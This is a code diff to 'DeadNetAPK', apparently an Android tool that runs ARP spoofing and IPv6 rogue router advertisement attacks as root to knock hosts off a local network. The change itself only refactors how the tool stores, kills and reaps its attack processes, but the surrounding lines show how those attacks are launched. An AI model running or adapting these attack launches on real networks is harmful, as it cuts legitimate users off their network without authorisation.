@@ -132,48 +132,51 @@ class DeadNetAPK:
         self._do_ipv4_attack(host_ip)
 
     def _ipv4_arp_ind_attack(self) -> None:
-        self._arp_ind_proc_pid = subprocess.Popen(
+        self._arp_ind_proc = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
              f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._arp_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        ).pid
-        Logger.info(f"DeadNet: started arp ind attack proc_id {self._arp_ind_proc_pid}")
+        )
+        Logger.info(f"DeadNet: started arp ind attack proc_id {self._arp_ind_proc.pid}")
 
     def _ipv4_arp_bcast_attack(self) -> None:
-        self._arp_bcast_proc_pid = subprocess.Popen(
+        self._arp_bcast_proc = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} "
              f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._arp_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        ).pid
-        Logger.info(f"DeadNet: started arp bcast attack proc_id {self._arp_bcast_proc_pid}")
+        )
+        Logger.info(f"DeadNet: started arp bcast attack proc_id {self._arp_bcast_proc.pid}")
 
     def _ipv6_nra_attack(self) -> None:
         # subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
         #                  f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
         #                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         # TODO add sleep and loop
-        self._nra_proc_pid = subprocess.Popen(
+        self._nra_proc = subprocess.Popen(
             ["su", "-c",
              f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
              f"{self._ipv6_preflen} {self._network_interface} {self._nra_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-        ).pid
-        Logger.info(f"DeadNet: started nra attack proc_id {self._nra_proc_pid}")
+        )
+        Logger.info(f"DeadNet: started nra attack proc_id {self._nra_proc.pid}")
 
     @staticmethod
-    def _kill_pid(pid: int):
-        if pid is not None:
+    def _kill_proc(proc: Any):
+        if proc is not None:
+            pid = proc.pid
             try:
                 res = subprocess.run(["su", "-c", f"kill -9 {pid}"],
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      text=True)
                 Logger.info(f"DeadNet: SIGKILL was sent to {pid}, stdout: {res.stdout}, stderr: {res.stderr}")
+                proc.wait()
+                Logger.info(f"DeadNet: {pid} reaped")
             except Exception as e:
                 # todo add log here
                 Logger.error(f"DeadNet: Unable to kill {pid}: {e} - {traceback.format_exc()}")
@@ -199,14 +202,14 @@ class DeadNetAPK:
         self._terminate_all_attacks()
 
     def _terminate_all_attacks(self):
-        self._kill_pid(self._nra_proc_pid)
-        self._nra_proc_pid = None
+        self._kill_proc(self._nra_proc)
+        self._nra_proc = None
 
-        self._kill_pid(self._arp_bcast_proc_pid)
-        self._arp_bcast_proc_pid = None
+        self._kill_proc(self._arp_bcast_proc)
+        self._arp_bcast_proc = None
 
-        self._kill_pid(self._arp_ind_proc_pid)
-        self._arp_ind_proc_pid = None
+        self._kill_proc(self._arp_ind_proc)
+        self._arp_ind_proc = None
 
     def start_attack(self) -> None:
         try:
